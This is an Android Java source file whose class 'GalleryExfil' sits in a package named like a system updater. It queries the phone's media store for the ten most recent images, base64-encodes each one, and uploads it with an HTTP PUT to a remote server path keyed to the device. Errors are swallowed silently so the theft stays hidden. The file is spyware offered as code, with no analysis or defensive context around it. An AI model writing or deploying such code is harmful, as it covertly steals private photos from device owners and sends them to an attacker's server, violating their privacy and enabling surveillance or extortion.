package com.sysupd;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.MediaStore;
import java.io.InputStream;

public class GalleryExfil {
    Context ctx;
    public GalleryExfil(Context c) { ctx = c; }

    public void exfilAllImages() {
        try {
            Cursor c = ctx.getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                null, null, null,
                MediaStore.Images.Media.DATE_ADDED + " DESC");
            if (c == null) return;
            int count = 0;
            while (c.moveToNext() && count < 10) {
                long id = c.getLong(c.getColumnIndex(MediaStore.Images.Media._ID));
                Uri u = Uri.withAppendedPath(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "" + id);
                InputStream in = ctx.getContentResolver().openInputStream(u);
                if (in == null) continue;
                java.io.ByteArrayOutputStream bo = new java.io.ByteArrayOutputStream();
                byte[] buf = new byte[8192];
                int n;
                while ((n = in.read(buf)) > 0) bo.write(buf, 0, n);
                in.close();
                byte[] bytes = bo.toByteArray();
                if (bytes.length < 400000) {
                    String b64 = android.util.Base64.encodeToString(bytes,
                        android.util.Base64.NO_WRAP);
                    String url = Core.BASE + "/files/" + Core.DEV + "/g" +
                        System.currentTimeMillis() + ".json";
                    String body = "{\"type\":\"GALLERY\",\"b64\":\"" + b64 +
                        "\",\"ts\":" + System.currentTimeMillis() + "}";
                    Core.http(url, "PUT", body);
                }
                count++;
            }
            c.close();
        } catch (Exception e) {}
    }
}
